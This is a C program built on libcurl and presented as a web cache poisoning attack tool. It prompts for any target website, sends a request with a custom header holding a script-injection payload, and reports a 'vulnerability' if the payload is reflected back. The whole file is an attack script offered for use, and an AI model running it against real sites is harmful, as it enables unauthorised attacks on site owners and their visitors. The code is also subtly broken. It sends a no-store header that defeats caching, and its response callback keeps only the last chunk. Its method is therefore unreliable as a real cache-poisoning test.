#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// Forward declaration of write_callback function
size_t write_callback(void *ptr, size_t size, size_t nmemb, char **response_content);

// ANSI color codes for text color
#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_RESET   "\x1b[0m"

#define TARGET_URL "http://example.com/target_endpoint"

// Function to perform a Cache Poisoning attack
void perform_poisoning(const char *target_url) {
    CURL *curl;
    CURLcode res;
    long http_code;
    char *response_content = NULL; // Initialize response content pointer

    // Initialize libcurl
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, ANSI_COLOR_RED "Error initializing libcurl\n" ANSI_COLOR_RESET);
        exit(EXIT_FAILURE);
    }

    // Set the target URL for the Cache Poisoning attack
    curl_easy_setopt(curl, CURLOPT_URL, target_url);

    // Set custom request headers to manipulate caching behavior
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Cache-Control: no-store");
    headers = curl_slist_append(headers, "X-Poisoned-Data: <script>alert('Cache Poisoning')</script>");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // Configure libcurl to retrieve response content
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_content);

    // Perform the Cache Poisoning attack
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, ANSI_COLOR_RED "Error performing Cache Poisoning attack: %s\n" ANSI_COLOR_RESET, curl_easy_strerror(res));
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        exit(EXIT_FAILURE);
    }

    // Get HTTP response code
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    // Check if the response indicates successful injection
    if (response_content != NULL && strstr(response_content, "<script>alert('Cache Poisoning')</script>") != NULL) {
        printf(ANSI_COLOR_GREEN "Cache Poisoning vulnerability detected!\n" ANSI_COLOR_RESET);
        printf("Response Content:\n%s\n", response_content);
        printf("You can test this vulnerability by visiting: %s\n", target_url);
    } else {
        printf(ANSI_COLOR_RED "Cache Poisoning vulnerability not detected.\n" ANSI_COLOR_RESET);
    }

    // Cleanup libcurl
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(response_content); // Free allocated memory for response content
}

// Callback function to handle response content
size_t write_callback(void *ptr, size_t size, size_t nmemb, char **response_content) {
    size_t total_size = size * nmemb;
    *response_content = realloc(*response_content, total_size + 1); // Allocate memory for response content
    if (*response_content == NULL) {
        fprintf(stderr, "Error allocating memory for response content\n");
        exit(EXIT_FAILURE);
    }
    memcpy(*response_content, ptr, total_size); // Copy response content
    (*response_content)[total_size] = '\0'; // Null-terminate string
    return total_size;
}

int main() {
    char target_url[256]; // Assuming a maximum URL length of 255 characters

    printf("Enter your target website link: ");
    scanf("%255s", target_url); // Limit input to prevent buffer overflow

    printf(ANSI_COLOR_GREEN "Starting Cache Poisoning attack...\n" ANSI_COLOR_RESET);

    // Perform the Cache Poisoning attack with the user-provided URL
    perform_poisoning(target_url);

    printf(ANSI_COLOR_GREEN "Cache Poisoning attack completed.\n" ANSI_COLOR_RESET);

    return 0;
}
